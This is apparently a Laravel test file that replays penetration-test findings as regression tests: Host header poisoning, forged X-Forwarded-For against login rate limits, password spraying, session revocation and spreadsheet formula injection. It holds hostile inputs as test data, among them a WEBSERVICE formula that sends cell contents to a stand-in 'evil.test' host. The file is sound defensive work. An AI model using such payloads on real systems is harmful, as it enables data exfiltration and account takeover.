<?php

namespace Tests\Feature;

use App\Mail\UserInvitation;
use App\Models\ActivationToken;
use App\Models\User;
use App\Support\AppUrl;
use App\Support\UserSessions;
use Illuminate\Mail\Message;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\RateLimiter;
use Maatwebsite\Excel\Concerns\FromArray;
use Maatwebsite\Excel\Excel as ExcelWriter;
use Maatwebsite\Excel\Facades\Excel;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Symfony\Component\Mime\Email;
use Tests\TestCase;

/** Attacks found during a penetration test, replayed so they stay closed. */
class AttackResistanceTest extends TestCase
{
    private function loginFailure(string $email, array $headers = [], array $server = []): bool
    {
        $this->withHeaders($headers)->withServerVariables($server)
            ->post('/connexion', ['email' => $email, 'password' => 'wrong-guess-'.uniqid()]);

        return str_contains(json_encode(session('errors')?->getBag('default')->get('email')), 'Trop de tentatives');
    }

    // ── Host header poisoning ──────────────────────────────────────────────

    public function test_password_reset_link_is_built_from_app_url_not_from_the_host_header(): void
    {
        config(['app.url' => 'https://suivi.simplon.test']);
        User::factory()->create(['email' => 'victim@example.org']);

        $bodies = [];
        Mail::shouldReceive('send')->andReturnUsing(function ($view, $data, $callback) use (&$bodies) {
            $message = new Message(new Email);
            $callback($message);
            $bodies[] = $message->getSymfonyMessage()->getHtmlBody();
        });

        $this->post('http://evil.attacker.test/mot-de-passe-oublie', ['email' => 'victim@example.org']);

        $this->assertCount(1, $bodies);
        $this->assertStringContainsString('https://suivi.simplon.test/reinitialisation/', $bodies[0]);
        $this->assertStringNotContainsString('evil.attacker.test', $bodies[0]);
    }

    public function test_invitation_link_is_built_from_app_url_not_from_the_host_header(): void
    {
        config(['app.url' => 'https://suivi.simplon.test']);
        $this->get('http://evil.attacker.test/connexion');

        $content = (new UserInvitation(User::factory()->create(), 'plain-token'))->content();

        $this->assertSame('https://suivi.simplon.test/activation/plain-token', $content->with['activationUrl']);
    }

    public function test_app_url_helper_joins_without_double_slashes(): void
    {
        config(['app.url' => 'https://suivi.simplon.test/']);

        $this->assertSame('https://suivi.simplon.test/a/b', AppUrl::to('/a/b'));
        $this->assertSame('https://suivi.simplon.test/a/b', AppUrl::to('a/b'));
    }

    // ── Forged client IP against the login rate limit ──────────────────────

    public function test_a_forged_forwarded_for_does_not_dodge_the_login_limit_from_an_untrusted_address(): void
    {
        RateLimiter::clear('login-ip|198.51.100.20');
        User::factory()->create(['email' => 'victim@example.org']);

        $locked = false;
        foreach (range(1, 8) as $i) {
            $locked = $this->loginFailure('victim@example.org', ['X-Forwarded-For' => "203.0.113.{$i}"], ['REMOTE_ADDR' => '198.51.100.20']);
        }

        $this->assertTrue($locked, 'the connecting address is not a proxy: its X-Forwarded-For must be ignored');
    }

    public function test_the_client_address_is_read_from_a_trusted_proxy_without_trusting_what_the_client_prepends(): void
    {
        User::factory()->create(['email' => 'victim@example.org']);

        $locked = false;
        foreach (range(1, 8) as $i) {
            // A proxy of the private network appends the real address (198.51.100.77) after whatever the client sent.
            $locked = $this->loginFailure('victim@example.org', ['X-Forwarded-For' => "203.0.113.{$i}, 198.51.100.77"], ['REMOTE_ADDR' => '10.0.0.5']);
        }

        $this->assertTrue($locked);
    }

    public function test_one_address_cannot_try_many_accounts(): void
    {
        $server = ['REMOTE_ADDR' => '198.51.100.30'];
        RateLimiter::clear('login-ip|198.51.100.30');

        $locked = false;
        foreach (range(1, 40) as $i) {
            $locked = $this->loginFailure("account{$i}@example.org", [], $server);
        }

        $this->assertTrue($locked, 'password spraying across accounts from one address is stopped');
        $this->assertFalse($this->loginFailure('someone@example.org', [], ['REMOTE_ADDR' => '198.51.100.31']), 'another address is not affected');
    }

    // ── Sessions and credentials ───────────────────────────────────────────

    public function test_a_deactivated_account_loses_its_open_session_on_every_page(): void
    {
        $user = $this->createAdmin();
        $this->actingAs($user)->get('/profil')->assertOk();

        $user->update(['is_active' => false]);

        foreach (['/', '/profil', '/notifications'] as $uri) {
            $this->actingAs($user)->get($uri)->assertRedirect(route('login'));
        }

        $this->assertGuest();
    }

    public function test_changing_the_email_needs_the_current_password(): void
    {
        $user = $this->createAdmin();
        $payload = ['first_name' => 'A', 'last_name' => 'B', 'email' => 'new@example.org'];

        $this->actingAs($user)->put('/profil/informations', $payload)->assertSessionHasErrors('current_password');
        $this->actingAs($user)->put('/profil/informations', $payload + ['current_password' => 'not-the-password'])
            ->assertSessionHasErrors('current_password');
        $this->assertNotSame('new@example.org', $user->fresh()->email);

        $this->actingAs($user)->put('/profil/informations', $payload + ['current_password' => 'password'])
            ->assertSessionHasNoErrors();
        $this->assertSame('new@example.org', $user->fresh()->email);
    }

    public function test_the_name_can_still_be_changed_without_the_password(): void
    {
        $user = $this->createAdmin();

        $this->actingAs($user)->put('/profil/informations', ['first_name' => 'Awa', 'last_name' => 'Traoré', 'email' => $user->email])
            ->assertSessionHasNoErrors();

        $this->assertSame('Awa', $user->fresh()->first_name);
    }

    public function test_the_current_password_cannot_be_guessed_from_a_stolen_session(): void
    {
        $user = $this->createAdmin();
        RateLimiter::clear('profile|'.$user->id);

        foreach (range(1, 5) as $i) {
            $this->actingAs($user)->put('/profil/mot-de-passe', ['current_password' => "guess-{$i}", 'password' => 'Xy1!abcdefgh', 'password_confirmation' => 'Xy1!abcdefgh'])
                ->assertSessionHasErrors('current_password');
        }

        $this->actingAs($user)->put('/profil/mot-de-passe', ['current_password' => 'guess-6', 'password' => 'Xy1!abcdefgh', 'password_confirmation' => 'Xy1!abcdefgh'])
            ->assertStatus(429);
    }

    public function test_changing_the_password_signs_the_other_sessions_out(): void
    {
        config(['session.driver' => 'database']);
        $user = $this->createAdmin();
        foreach (['stolen-session', 'other-device'] as $id) {
            DB::table('sessions')->insert(['id' => $id, 'user_id' => $user->id, 'ip_address' => '203.0.113.9', 'user_agent' => 'x', 'payload' => '', 'last_activity' => time()]);
        }

        UserSessions::revokeAll($user, 'other-device');

        $this->assertSame(['other-device'], DB::table('sessions')->where('user_id', $user->id)->pluck('id')->all());
    }

    public function test_resetting_the_password_signs_every_session_out_and_rotates_the_remember_token(): void
    {
        config(['session.driver' => 'database']);
        $user = User::factory()->create(['remember_token' => 'old-remember']);
        DB::table('sessions')->insert(['id' => 'stolen-session', 'user_id' => $user->id, 'ip_address' => '203.0.113.9', 'user_agent' => 'x', 'payload' => '', 'last_activity' => time()]);
        $plain = 'reset-token-'.str_repeat('a', 40);
        ActivationToken::create(['user_id' => $user->id, 'token' => hash('sha256', $plain), 'type' => 'password_reset', 'expires_at' => now()->addHour()]);

        $this->post("/reinitialisation/{$plain}", ['password' => 'Xy1!abcdefgh', 'password_confirmation' => 'Xy1!abcdefgh'])
            ->assertRedirect(route('login'));

        $this->assertSame(0, DB::table('sessions')->where('user_id', $user->id)->count());
        $this->assertNotSame('old-remember', $user->fresh()->remember_token);
    }

    // ── Formula injection through exports ──────────────────────────────────

    public function test_a_text_starting_with_an_equals_sign_is_exported_as_text_not_as_a_formula(): void
    {
        $export = new class implements FromArray
        {
            public function array(): array
            {
                return [['=1+1', '=WEBSERVICE("http://evil.test/?x="&A1)', '+SUM(1,1)', 'normal', 42]];
            }
        };

        $file = tempnam(sys_get_temp_dir(), 'xlsx');
        file_put_contents($file, Excel::raw($export, ExcelWriter::XLSX));
        $sheet = IOFactory::load($file)->getActiveSheet();
        unlink($file);

        foreach (['A1', 'B1', 'C1', 'D1'] as $cell) {
            $this->assertSame(DataType::TYPE_STRING, $sheet->getCell($cell)->getDataType(), $cell);
        }

        $this->assertSame('=1+1', $sheet->getCell('A1')->getValue(), 'the text is kept as typed');
        $this->assertSame(DataType::TYPE_NUMERIC, $sheet->getCell('E1')->getDataType(), 'numbers are still numbers');
    }

    // ── Inertia DevTools ───────────────────────────────────────────────────

    public function test_inertia_devtools_are_off_unless_enabled_on_purpose(): void
    {
        $this->assertFalse(config('inertia.devtools.enabled'));
        $this->get('/_inertia/devtools/entries')->assertNotFound();
    }
}
